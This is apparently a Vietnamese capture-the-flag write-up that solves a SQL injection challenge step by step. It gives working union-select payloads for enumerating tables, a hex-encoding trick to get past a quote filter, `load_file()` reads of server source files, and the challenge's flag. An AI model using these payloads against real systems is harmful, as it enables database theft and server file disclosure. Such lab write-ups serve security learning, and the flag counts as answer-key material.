# SQL-FileReading

Point: 40

Reading file with SQL!

Statement: Retrieve the administrator password.

# Overview:

Form của challenge

![image](https://user-images.githubusercontent.com/115911041/233352300-2af89520-7cd2-4ffa-81a9-ebf0d9460150.png)

Goal của challenge này là phải có password của administrator.

# Solution

Đầu tiên mình thử fuzz ở mục member `id=1` bằng đấu `'` 

![image](https://user-images.githubusercontent.com/115911041/233359629-5b99159d-4c3c-435e-b995-7dbeb4102f69.png)

Như đã thấy ta có thể khai thác lỗ hổng này.Tiếp theo ta sử dụng Burp Suite để Intercept

Đầu tiên cần xác định số column. Sử dụng toán tử `AND`để câu logic phía trước sai và trả về kết quả của câu lệnh select phía sau.

`AND 1=0 union all select 1,2,3,4 --`

![image](https://user-images.githubusercontent.com/115911041/233360508-37e4ba58-eb8c-4252-9f80-587b1e3e934b.png)

Kết quả là cột 1,2,4 bị lỗi. Cột email thì có dạng string, 2 cột còn lại dạng số. Vậy thì mình chọn cột email để khai thác.Payload mình dùng lần này cũng khá giống challenge Routed.

`AND 1=0 union all select 1,2,3,(select group_concat(table_name) from information_schema.tables where table_schema=database())-- --`

![image](https://user-images.githubusercontent.com/115911041/233362366-e0c63fa3-c5f7-4509-9897-ec99df015d01.png)

Thấy kết quả trả về là 1 bảng member.Kế đó ta tiếp tục khai thác `column_name` từ bảng `member` nhưng vấn đề là bị filter đi dấu `'`, nên ta phải chuyển sang member dạng Hex

`And 1=0 union all select 1,2,3,(select group_concat(column_name) from information_schema.columns where table_name=0x6d656d626572)-- --`

![image](https://user-images.githubusercontent.com/115911041/233365320-e7e34155-4dc9-47d7-95d6-9e767bd09d0d.png)

Kết quả xuất hiện 4 columns, nhưng quan trọng ở đây là `memeber_login` và `member_password`.

`And 1=0 union all select 1,2,3,(select member_password from member)-- --`

![image](https://user-images.githubusercontent.com/115911041/233365720-2a7a00b6-234b-4403-a240-8985e341f312.png)

Kết quả ở email cho ra `member_password` là dạng Base64, ta sẽ đem decode nó.Nhưng lại không cho kết quả.Sau một hồi tìm hiểu ở Docs mà challenge cung cấp, thì mình khám phả được là hàm `load_file()` được dùng để đọc file bên dưới hệ thống. VD `load_file('/web-serveur/ch31/index.php')`

Vậy để xử lí cái password thì ta cần phải tìm ra đường dẫn tới cái chỗ mà nó được xử lí thưởng là file `index.php`. Sau khi mày mò, thì bị từ chối hết, nhưng nếu các bạn đã làm nhưng bài LFI thì thường sử dụng một đưởng dẫn rất quen thuộc `/challenge/web-serveur/ch31/index.php`.Ta sẽ Hex đường dẫn đó

`And 1=0 union all select 1,2,3,load_file(0x2f6368616c6c656e67652f7765622d736572766575722f636833312f696e6465782e706870)-- --`

![image](https://user-images.githubusercontent.com/115911041/233372552-7abc1be9-cc44-4829-b785-5c2e6ecd2121.png)

Kết quả là một nùi như vậy @@. Ta có một file index.php. Bỏ những phần râu ria đi ta chỉ cần quan tâm đến password

![image](https://user-images.githubusercontent.com/115911041/233373538-86b6d66e-8fd0-49dd-81f6-6f40934cff5b.png)

![image](https://user-images.githubusercontent.com/115911041/233373641-010e9d30-ee6b-4a6d-9c75-05b165870528.png)

![image](https://user-images.githubusercontent.com/115911041/233374185-a8516c9a-14c2-413b-832a-6be5ce78d5a1.png)

[String XOR](https://en.wikipedia.org/wiki/XOR_cipher)

Ta thấy để đăng nhập vào quyền admin thì giá trị password của ta sau khi gửi lên sẽ qua hàm `sha1($pasword)` và giá trị bằng giá trị trả về hàm `stringxor()`.

Phân tích hàm `stringxor()`. Nó sẽ nhận vào 2 chuỗi, cụ thể là giá trị của biến `$key` đã có sẵn, và `base64_decode($data[‘member_password’])`. Biến `$data[‘member_password’]` sẽ được lấy qua câu truy vấn `SELECT member_password FROM member WHERE …` gì đó

Bây giờ mình sẽ giả lập thử source code đã cho của challenge. 

![image](https://user-images.githubusercontent.com/115911041/233376272-7136f771-ed31-4605-b000-e3174414f539.png)

Sau đó đi mã hóa sha1
 `Flag: superpassword`






